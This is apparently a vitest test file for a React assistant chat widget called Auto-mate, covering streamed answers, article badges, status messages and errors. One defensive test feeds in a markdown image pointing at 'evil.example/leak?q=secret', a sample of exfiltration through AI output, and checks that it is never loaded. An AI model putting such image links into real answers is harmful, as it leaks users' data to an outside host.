import { fireEvent, screen, waitFor } from '@testing-library/react';
import { http, HttpResponse } from 'msw';
import { describe, expect, it } from 'vitest';
import { antiforgeryHandler } from '../test/handlers';
import { server } from '../test/server';
import { renderWithProviders } from '../test/utils';
import AssistantWidget from './AssistantWidget';

const enabled = http.get('/api/assistant/status', () => HttpResponse.json({ enabled: true }));

const sse = (...events: object[]) =>
  new HttpResponse(events.map((e) => `data: ${JSON.stringify(e)}\n\n`).join(''), {
    headers: { 'Content-Type': 'text/event-stream' },
  });

async function ask(question: string) {
  fireEvent.click(await screen.findByRole('button', { name: 'Open Auto-mate assistant' }));
  fireEvent.change(await screen.findByRole('textbox', { name: 'Your question' }), { target: { value: question } });
  fireEvent.click(screen.getByRole('button', { name: 'Send' }));
}

describe('AssistantWidget', () => {
  it('stays hidden when the assistant is switched off', async () => {
    renderWithProviders(<AssistantWidget />);

    await waitFor(() => expect(screen.queryByRole('button', { name: 'Open Auto-mate assistant' })).not.toBeInTheDocument());
  });

  it('shows the brand Auto-mate logo on a surface launcher', async () => {
    server.use(enabled);
    renderWithProviders(<AssistantWidget />);

    const launcher = await screen.findByRole('button', { name: 'Open Auto-mate assistant' });
    expect(launcher).toHaveAttribute('data-variant', 'default');
    expect(launcher.querySelector('img')).toHaveAttribute('width', '44');
    expect(launcher.querySelector('svg')).toBeNull();
  });

  it('streams the answer and shows cited articles as badges', async () => {
    let body: unknown;
    server.use(
      enabled,
      antiforgeryHandler(),
      http.post('/api/assistant/messages', async ({ request }) => {
        body = await request.json();
        return sse(
          { type: 'text_delta', text: 'Use your company email. ' },
          { type: 'text_delta', text: 'See Signing up for an account.' },
          { type: 'done', sources: [{ articleId: 'a1', title: 'Signing up for an account', isFaq: false }] },
        );
      }),
    );
    renderWithProviders(<AssistantWidget pageContext="Page: /; Organisation: Urgent" />);

    await ask('Which email should I use?');

    expect(await screen.findByText('Use your company email. See Signing up for an account.')).toBeInTheDocument();
    expect(await screen.findByText('Signing up for an account', { selector: '.mantine-Badge-label' })).toBeInTheDocument();
    expect(body).toEqual({
      messages: [{ role: 'user', content: 'Which email should I use?' }],
      pageContext: 'Page: /; Organisation: Urgent',
    });
  });

  it('sends a suggested question when one is clicked', async () => {
    let body: { messages: { content: string }[] } | undefined;
    server.use(
      enabled,
      antiforgeryHandler(),
      http.post('/api/assistant/messages', async ({ request }) => {
        body = (await request.json()) as typeof body;
        return sse({ type: 'text_delta', text: 'Use the organisation menu.' }, { type: 'done' });
      }),
    );
    renderWithProviders(<AssistantWidget />);

    fireEvent.click(await screen.findByRole('button', { name: 'Open Auto-mate assistant' }));
    fireEvent.click(await screen.findByRole('button', { name: 'How do I switch to another organisation?' }));

    expect(await screen.findByText('Use the organisation menu.')).toBeInTheDocument();
    expect(body?.messages[0].content).toBe('How do I switch to another organisation?');
  });

  it('shows no badges when the answer cites nothing', async () => {
    server.use(enabled, antiforgeryHandler(), http.post('/api/assistant/messages', () => sse({ type: 'text_delta', text: 'Yes.' }, { type: 'done' })));
    renderWithProviders(<AssistantWidget />);

    await ask('Can I sign up today?');

    expect(await screen.findByText('Yes.')).toBeInTheDocument();
    expect(document.querySelector('.mantine-Badge-root')).toBeNull();
  });

  it('never loads images from an answer and opens links in a new tab without a referrer', async () => {
    const answer = 'See ![x](https://evil.example/leak?q=secret) and [the guide](https://help.example/guide).';
    server.use(enabled, antiforgeryHandler(), http.post('/api/assistant/messages', () => sse({ type: 'text_delta', text: answer }, { type: 'done' })));
    renderWithProviders(<AssistantWidget />);

    await ask('How do I switch to another organisation?');

    const link = await screen.findByRole('link', { name: 'the guide' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    expect(document.querySelector('img[src*="evil.example"]')).toBeNull();
  });

  it('says what Auto-mate is doing until the answer starts, then clears it', async () => {
    let release!: () => void;
    const gate = new Promise<void>((resolve) => (release = resolve));
    const frame = (e: object) => new TextEncoder().encode(`data: ${JSON.stringify(e)}\n\n`);
    server.use(
      enabled,
      antiforgeryHandler(),
      http.post(
        '/api/assistant/messages',
        () =>
          new HttpResponse(
            new ReadableStream({
              async start(controller) {
                controller.enqueue(frame({ type: 'status', text: 'searching_kb' }));
                await gate;
                controller.enqueue(frame({ type: 'text_delta', text: 'Use the organisation menu.' }));
                controller.enqueue(frame({ type: 'done' }));
                controller.close();
              },
            }),
            { headers: { 'Content-Type': 'text/event-stream' } },
          ),
      ),
    );
    renderWithProviders(<AssistantWidget />);

    await ask('How do I switch to another organisation?');

    // The status line shows "Thinking…" first; wait for the server's status frame to replace it.
    await waitFor(() => expect(screen.getByRole('status')).toHaveTextContent('Searching help articles…'));
    release();
    expect(await screen.findByText('Use the organisation menu.')).toBeInTheDocument();
    await waitFor(() => expect(screen.queryByRole('status')).not.toBeInTheDocument());
  });

  it('shows the server reason when a turn is refused', async () => {
    server.use(
      enabled,
      antiforgeryHandler(),
      http.post('/api/assistant/messages', () => HttpResponse.json({ error: 'The assistant is busy right now.' }, { status: 429 })),
    );
    renderWithProviders(<AssistantWidget />);

    await ask('Hello');

    expect(await screen.findByRole('alert')).toHaveTextContent('The assistant is busy right now.');
  });
});
